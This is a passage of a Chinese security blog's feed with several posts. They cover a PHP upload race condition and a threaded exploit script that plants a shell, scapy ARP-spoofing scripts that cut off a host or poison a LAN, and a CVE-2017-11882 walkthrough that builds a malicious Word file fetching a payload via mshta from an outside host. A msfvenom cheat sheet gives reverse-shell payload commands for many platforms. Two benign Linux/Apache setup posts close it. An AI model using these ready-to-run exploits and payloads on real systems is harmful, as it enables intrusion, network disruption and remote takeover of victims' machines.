class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t = threading.Thread(target=post)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure></p><p>因为这个漏洞很受环境因素的影响，比如网络延迟、服务器的处理能力等，所以只执行一次可能并不会成功，尝试几次后意想不到的结果还是发生了。。。<br><img src alt></p><p>由于多线程访问，数据库update一次的时间内update了多次，导致数据出现错误，这在银行、电商等有支付的地方影响是巨大的。</p><p>0x03漏洞实战<br>要找个实战还真是不容易，在网上翻了半天只找到几个比较老的漏洞，一般会将其归为逻辑漏洞。看了一下套路都差不多，我简化了一下步骤，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);</span><br><span class="line">    $size = 10000000;</span><br><span class="line">    $path = &quot;./&quot;;</span><br><span class="line"></span><br><span class="line">    $filename = $_FILES[&apos;myfile&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">    if (is_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">        if (!move_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;],$path.$filename))&#123;</span><br><span class="line">            die(&quot;error:can not move!&quot;);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;error:not an upload file！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $newfile = $path.$filename;</span><br><span class="line">    echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    if ($_FILES[&apos;myfile&apos;][&apos;error&apos;] &gt; 0)&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        die(&quot;Upload file error: &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ext = array_pop(explode(&quot;.&quot;,$_FILES[&apos;myfile&apos;][&apos;name&apos;]));</span><br><span class="line">    if (!in_array($ext,$allowtype))&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        die(&quot;error:upload the file type is not allowed，delete the file！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>简单解释一下，首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”。<br>我们的利用思路是这样的，首先上传一个php文件，内容为：</p><figure class="highlight plain"><figcaption><span>fputs(fopen("info.php", "w"), "<?php phpinfo(); ?>"); ?>```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</span><br></pre></td></tr></table></figure><p>import requests<br>import threading<br>import os</p><p>class RaceCondition(threading.Thread):<br>    def <strong>init</strong>(self):<br>        threading.Thread.<strong>init</strong>(self)</p><pre><code>    self.url = &apos;http://127.0.0.1/a.php&apos;    self.uploadUrl = &apos;http://127.0.0.1/race.php&apos;def _get(self):    print(&apos;try to call uploaded file...&apos;)    r = requests.get(self.url)    if r.status_code == 200:        print(&apos;[*] create file info.php success.&apos;)        os._exit(0)def _upload(self):    print(&apos;upload file...&apos;)    file = {&apos;myfile&apos;: open(&apos;a.php&apos;, &apos;r&apos;)}    requests.post(self.uploadUrl, files=file)def run(self):    while True:        for i in range(5):            self._get()        for i in range(10):            self._upload()            self._get()</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    threads = 50    </p><pre><code>for i in range(threads):    t = RaceCondition()    t.start()for i in range(threads):    t.join()</code></pre><p>经过几次尝试，成功得到了shell。<br><code>`</code></p><p>0x04漏洞防御<br>对于数据库的操作，正牌的方法是设置锁，这个之后还要仔细研究一下。<br>对于文件上传，一定要经过充分完整的检查之后再上传，不要玩花样。。。<br>在操作系统的角度，共享数据要进行上锁保护（互斥？同步？）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;来源于：&lt;a href=&quot;http://seaii-blog.com/index.php/2017/04/26/49.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://seaii-blog.com/index.p
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python 实现局域网内arp欺骗</title>
    <link href="https://vuln.top/2019/02/21/9/"/>
    <id>https://vuln.top/2019/02/21/9/</id>
    <published>2019-02-21T03:45:07.021Z</published>
    <updated>2019-02-21T03:45:07.030Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->arp协议数据包<br>——–<br><img src="http://image.3001.net/images/20180116/15160949496413.png" alt="请输入图片描述"><br>op:1(op值为1说明这是一次arp请求)<br>hwsrc：发送方MAC地址（即本机器MAC地址）<br>psrc：发送方ip地址（即本机内网ip地址）<br>hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00）<br>pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1）<br>局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下<br>op:2(op值为2说明这是一次arp响应)<br>hwsrc：发送方MAC地址（即网关MAC地址）<br>psrc：发送方ip地址（即网关ip地址）<br>hwdst：目标MAC地址（为发起arp请求的机器的MAC地址）<br>pdst：目标ip地址（为发起arp请求的机器的ip地址）<br><br><br>代码1:<br>对单个ip进行arp欺骗 断网<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = Ether(dst=tmip,src=localmac)/ARP(op=1,psrc=gip,hwsrc=localmac,pdst=tip,hwdst=tmip) </span><br><span class="line">while 1:</span><br><span class="line">    sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br></pre></td></tr></table></figure><p>arp欺骗中间人攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = Ether(dst=tmip,src=localmac)/ARP(op=1,psrc=gip,hwsrc=gmip,pdst=tip,hwdst=tmip) </span><br><span class="line">while 1:</span><br><span class="line">    sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br></pre></td></tr></table></figure></p><p>arp 欺骗整个局域网:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">#tip = &quot;192.168.235.136&quot;</span><br><span class="line">gip = &quot;192.168.235.2&quot;</span><br><span class="line">#tmip = getmacbyip(tip)</span><br><span class="line">gmip = getmacbyip(gip)</span><br><span class="line">localmac = get_if_hwaddr(&quot;eth0&quot;)</span><br><span class="line">sendArp = srploop(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(hwsrc=gmip,psrc=gip,op=2))</span><br><span class="line">while 1:</span><br><span class="line">    try:</span><br><span class="line">        sendp(sendArp,inter=2,iface=&quot;eth0&quot;)</span><br><span class="line">        if is_sigint_up:</span><br><span class="line">            print &quot;exit&quot;</span><br><span class="line">            is_sigint_up=False</span><br><span class="line">            cotinue</span><br><span class="line">    except:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;arp协议数据包&lt;br&gt;——–&lt;br&gt;&lt;img src=&quot;http://image.3001.net/images/20180116/15160949496413.png&quot; alt=&quot;请输入图片描述&quot;&gt;&lt;br&gt;op:1(op值为1说明这是一次arp请
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-11882复现</title>
    <link href="https://vuln.top/2019/02/21/66/"/>
    <id>https://vuln.top/2019/02/21/66/</id>
    <published>2019-02-21T03:45:06.761Z</published>
    <updated>2019-02-23T15:25:44.805Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->漏洞环境<br>—-<br>攻击机:kali linux<br>靶机:windows 7 旗舰版<br>工具及说明<br>—-<br>CVE-2017-11882漏洞利用复现<br>2017年11月14日微软发布了潜伏17年之久的office远程代码执行漏洞（cve-2017-11882）。该漏洞为office内存破坏漏洞，影响目前流行的office版本。<br>首先到github上下载一个poc<br>原脚本来自于 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们下载这个 ```https://github.com/iBearcat/CVE-2017-11882</span><br></pre></td></tr></table></figure><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步:：python Command_CVE-2017-11882.py -c “cmd.exe /c calc.exe” -o test.doc</span><br></pre></td></tr></table></figure><p><img src="http://118.126.66.150/52sec/08/1330119719.png" alt="10fb1511876761.png"><br>如果成功的话是这样的</p><p>现在我们反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载koadic</span><br><span class="line">安装 git clone https://github.com/zerosum0x0/koadic.git</span><br><span class="line">使用 ./koadic</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/52sec/08/3346544335.png" alt="09dd1511876776.png"><br>设置LHOST 端口默认9999我们不变<br><img src="http://118.126.66.150/52sec/08/3350927297.png" alt="82661511876798.png"><br>这里可能有utf-8的报错解决方法如下<br><img src="http://118.126.66.150/52sec/08/2706007116.png" alt="602e1511876855.png"><br>wq保存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法：python Command_CVE-2017-11882.py -c “mshta http://site.com/abc“ -o test.doc</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/52sec/08/4278044751.png" alt="7afb1511876876.png"><br>打开word 拿到权限<br><img src="http://118.126.66.150/52sec/08/302886616.png" alt="586e1511876901.png"></p><p>结束</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;漏洞环境&lt;br&gt;—-&lt;br&gt;攻击机:kali linux&lt;br&gt;靶机:windows 7 旗舰版&lt;br&gt;工具及说明&lt;br&gt;—-&lt;br&gt;CVE-2017-11882漏洞利用复现&lt;br&gt;2017年11月14日微软发布了潜伏17年之久的office远程代码
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>msfvenom 进阶</title>
    <link href="https://vuln.top/2019/02/21/45/"/>
    <id>https://vuln.top/2019/02/21/45/</id>
    <published>2019-02-21T03:45:06.153Z</published>
    <updated>2019-02-21T03:45:06.162Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->最近在看msfvenom生成木马感觉这个文章不错就搬过来了，下面有表哥的博客原地址<br><br>0x01 msfvenom 常规选项用途:<br><br>1. -l  列出所有可用的payload,编码器,空指令……<br>2. -p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的<br>3. -f  指定payload输出的文件类型,–help-formats,可查看支持的所有输出格式<br>4. -e  指定要使用那种编码器<br>5. -i  指定编码的次数,如果使用编码器<br>6. -b  指定坏字符,比如空字符截断问题,等等……<br>7. -x  使用一个自定义可执行程序模板,并将payload嵌入其中<br>8. -k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用<br>9. -o  指定创建好的payload的存放位置<br>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set lport 443</span><br><span class="line">msf &gt; set lhost 192.168.3.12</span><br><span class="line">msf &gt; exploit -j</span><br></pre></td></tr></table></figure><p>0x03 实例创建各类系统平台下的payload:<br>windows 平台,普通的exe 直接双击即可触发,会弹回一个常规meterpreter</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o x86_shell.exe</p></blockquote><p>powershell,把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1</p></blockquote><p>linux 平台,直接赋予执行权限,执行即可触发,关于如何将payload嵌入deb或者rpm包中,我们后续再单独说</p><blockquote><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f elf -o x86_shell</p></blockquote><p>mac 平台,暂没实际测试</p><blockquote><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f macho -o x86_shell.macho</p></blockquote><p>android平台 注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发,关于如何向正常的app中嵌入msf的payload后期也会单独再说明</p><blockquote><p>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f apk -o x86_shell.apk</p></blockquote><p>基于各类web脚本,对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可<br>php 脚本</p><blockquote><p>msfvenom –platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.php</p></blockquote><p>aspx 脚本</p><blockquote><p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f aspx -o x86_shell.aspx</p></blockquote><p>jsp 脚本</p><blockquote><p>msfvenom –platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.jsp</p></blockquote><p>war包,找个能部署war包的地方,如各类java控制台,部署一下即可执行</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.war</p></blockquote><p>基于其它各类脚本的payload,说几个实战中可能会碰到的语言环境</p><p>nodejs</p><blockquote><p>msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.js</p></blockquote><p>python</p><blockquote><p>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.py</p></blockquote><p>perl</p><blockquote><p>msfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.pl</p></blockquote><p>ruby</p><blockquote><p>msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.rb</p></blockquote><p>lua</p><blockquote><p>msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=443 -f raw -o x86_shell.lua</p></blockquote><p>0x04 利用wireshark观察不同协议下的payload的运作细节:</p><p>bind类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp</span><br><span class="line">windows/meterpreter/bind_tcp_rc4</span><br><span class="line">windows/meterpreter/bind_hidden_tcp</span><br></pre></td></tr></table></figure><p>reverse类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/reverse_tcp</span><br><span class="line">windows/meterpreter/reverse_tcp_dns</span><br><span class="line">windows/meterpreter/reverse_tcp_rc4</span><br><span class="line">windows/meterpreter/reverse_tcp_rc4_dns</span><br><span class="line">windows/meterpreter/reverse_http</span><br><span class="line">windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure></p><p>32位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure></p><p>64位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></p><p>0x05 生成不同平台下的shellcode<br>win平台shellcode</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>linux平台shellcode</p><blockquote><p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>mac平台shellcode</p><blockquote><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=443 -f c</p></blockquote><p>0x06 将普通类型的shell升级为meterpreter:</p><p>post/multi/manage/shell_to_meterpreter</p><p>原文章地址:<a href="https://klionsec.github.io/2017/03/08/msfvenom-advanced/" target="_blank" rel="noopener">https://klionsec.github.io/2017/03/08/msfvenom-advanced/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;最近在看msfvenom生成木马感觉这个文章不错就搬过来了，下面有表哥的博客原地址&lt;br&gt;&lt;br&gt;0x01 msfvenom 常规选项用途:&lt;br&gt;&lt;br&gt;1. -l  列出所有可用的payload,编码器,空指令……&lt;br&gt;2. -p  指定要使用
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux软件安装 ./configure,make,make install的作用</title>
    <link href="https://vuln.top/2019/02/21/40/"/>
    <id>https://vuln.top/2019/02/21/40/</id>
    <published>2019-02-21T03:45:05.948Z</published>
    <updated>2019-02-21T03:45:05.961Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。<br><br>./configure(配置）<br>configure会根据当前系统环境和指定参数生成makefile文件，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr 意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin （而不是默认的 /usr/local/bin),资源文件就会安装在 /usr/share（而不是默认的/usr/local/share）。同时一些软件的配置文件你可以通过指定 –sys-config= 参数进行设定。有一些软件还可以加上 –with、–enable、–without、–disable 等等参数对编译加以控制，你可以通过允许 ./configure –help 察看详细的说明帮助。它常用的参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">–help：输出帮助信息</span><br><span class="line">–prefix=PREFIX：将所有文件安装到PREFIX文件夹下。实际上不同的文件会被安装到不同的子文件夹中。</span><br><span class="line">–exec-prefix=EXEC-PREFIX：结构依赖文件的安装位置。默认与PREFIX相同。</span><br><span class="line">–bindir=BINDIR：可执行程序目录。默认为EXEC-PREFIX/bin。</span><br><span class="line">–datadir=DATADIR：程序所需只读文件的目录。默认为PREFIX/share。</span><br><span class="line">–sysconfdir=SYSCONFDIR：配置文件的目录。默认为PREFIX/etc。</span><br><span class="line">–libdir=LIBDIR：库文件和动态装在模块的目录。默认为EXEC-PREFIX/lib。</span><br><span class="line">–includedir=INCLUDEDIR：C和C++头文件的目录。默认是PREFIX/include。</span><br><span class="line">–docdir=DOCDIR：文档文件目录。默认是PREFIX/doc。</span><br><span class="line">–mandir=MANDIR：手册目录。默认是PREFIX/man。</span><br><span class="line">–with-includes=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录被加入到编译器的头文件中。例如：–with-includes=/opt/gun/includes/</span><br><span class="line">–with-libraries=DIRS：DIRS是一系列冒号分隔的文件夹，这些目录用于查找库文件。例如：–with-libraries=/opt/gnu/lib:/usr/sup/lib</span><br><span class="line">–enable-locale：打开区域支持。</span><br><span class="line">–enable-recode：打开单字节字符集记录的支持。</span><br><span class="line">–enable-multibyte：允许使用多字节编码。</span><br></pre></td></tr></table></figure><p>make（编译）<br>make，这一步就是编译，当执行make的时候，make会在当前目录下搜索Makefile（makefile）这个文本文件，而makefile里面记录了源码如何编译的详细信息。</p><p>make install（安装）<br>make insatll，这条命令来进行安装，这一步一般需要你有 root 权限（因为要向系统写入文件）。</p><p>其他命令：</p><p><code>make clean</code> 清除编译产生的可执行文件及目标文件。<br><code>make distclean </code>除了清除可执行文件和目标文件外，把configure所产生的Makefile也清除掉。<br><code>make dist </code>将程序和相关的档案包装成一个压缩文件以供发布。<br>怎么卸载编译安装(make install)的软件？<br>使用安装包自带的反安装程序<br>常见的反安装target有： make uninstall/distclean/veryclean 等，但并不是每个源代码包都提供反安装，这不是个通用方法等。</p><p>通过删除编译时设置的单独目录<br>如果编译时设置了–prefix到一个单独的文件夹，就删除那个文件夹即可，但如果编译安装到了类似/usr这种地方，找一个临时目录重新安装一遍，如：</p><p><code>./configure –prefix=/tmp/to_remove &amp;&amp; make install</code></p><p>然后遍历/tmp/to_remove的文件，删除对应安装位置的文件即可。</p><p>通过安装日志删除<br>安装日志里能够看得到到底安装了那些文件到那些位置，通常会使用’cp’或者’install’命令拷贝文件。可以事先记得记录’make install’的所有输出日志，’make install &amp;&gt; |tee make.log’。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!--markdown--&gt;自行安装编译Linux软件过程中会执行三个步骤：./configure,make,make install。这三个步骤在安装过程中到底起到什么作用，先前一直糊里糊涂的，今天就来一起学习下。&lt;br&gt;&lt;br&gt;./configure(配置）&lt;br&gt;conf
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>apache 使用 mysql基本身份验证</title>
    <link href="https://vuln.top/2019/02/21/38/"/>
    <id>https://vuln.top/2019/02/21/38/</id>
    <published>2019-02-21T03:45:05.838Z</published>
    <updated>2019-02-21T03:45:05.848Z</updated>
    
    <content type="html"><![CDATA[<p><!--markdown-->第一步安装所有需要的组建(mysql,apache,apache_mysql认证)<br><code>yum install -y mysql-server mod_auth_mysql mysql httpd</code></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/2498692.jpg" alt></p><p>首先配置mysql 账号密码（这里我们就设置全明文验证）<br>设置mysql密码 <code>mysqladmin -u root password 123456</code><br>如果mysql 密码忘记了可以用这个命令<code>mysqladmin -u root flush-privileges password “newpassword”</code></p><p>登陆mysql<br><code>mysql -u root -p</code><br>创建数据库<br><code>create database httpauth;(一定要加;）</code><br>使用数据库<br><code>use httpauth;</code><br>创建表<br><code>create table auth(name char(25),pwd char(25));</code><br>写入auth数据库<br><code>INSERT INTO auth(name,pwd) VALUES(‘user03’,encrypt(111));</code><br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/64913229.jpg" alt></p><p>我们访问到/etc/httpd/conf.d这个目录<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/61990036.jpg" alt></p><p>配置auth_mysql.conf<br>在最下面配置<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/61300409.jpg" alt></p><p>为什么我们在auth_mysql.conf 配置 主策略能读到<br><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/88433178.jpg" alt></p><p>启动服务<br><code>service httpd start</code></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/56655948.jpg" alt></p><p><img src="http://ovgfhrbzx.bkt.clouddn.com/18-3-16/82301276.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;!--markdown--&gt;第一步安装所有需要的组建(mysql,apache,apache_mysql认证)&lt;br&gt;&lt;code&gt;yum install -y mysql-server mod_auth_mysql mysql httpd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;i
      
    
    </summary>
    
    
  </entry>
  
</feed>
